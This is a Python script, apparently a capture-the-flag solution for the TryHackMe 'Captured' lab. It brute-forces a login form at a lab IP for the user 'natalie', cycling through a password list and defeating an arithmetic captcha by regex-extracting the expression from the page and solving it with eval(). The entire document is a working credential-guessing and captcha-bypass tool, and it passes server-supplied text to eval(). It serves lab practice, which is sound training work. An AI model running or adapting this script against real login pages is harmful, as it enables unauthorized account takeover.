# I created this script for the password attack on the TryHackMe 'Captured' room. It goes with the username-enumeration.py script. 

import requests 
import re
import sys

# Enter URL
login_url = 'http://10.10.183.200/login'

# Open the files containing passwords
with open('passwords.txt') as pass_file:
    # Loop through each line in the passwords file 
    for password in pass_file: 
            # Session object to persist cookies across requests
            session = requests.Session()

            # Login POST request data 
            data = {
                'username': 'natalie'.strip(), # the 'natalie' user was discovered in the username enumeration script
                'password': password.strip(), 
                'captcha': 0
            }

            # Make the login POST request
            response = session.post(login_url, data=data)

            # Check if login was successful 
            if 'Invalid captcha' not in response.text:
                print(f'Login was successful with {password.strip()}')
                print(response.text)
                break 
            else:
                # Extract math operation from the HTML Response using Regex
                math_op_regex = r'\b(\d+)\s*[-+*/]\s*(\d+)\b'
                match = re.search(math_op_regex, response.text)
                if match:
                    # Solve the math operations using eval() 
                    math_op = match.group(0)
                    solution = eval(math_op) 
                    print(f'Captcha math operation: {math_op}')
                    print(f'Solution: {solution}')
                    # Add Captcha response filed to the dictionary
                    data['captcha'] = solution
                    response = session.post(login_url, data=data) 
                    if 'Invalid password for user' not in response.text:
                        print(f'Login successful with {password.strip()}')
                        print(response.text)
                        sys.exit(0)
                    else:
                        print(response.text)
                        print('Login was unsuccessful')
                else:
                    print('Login failed. Captcha math operation not found in the HTML response.')
                    print(response.text)
            session.close()
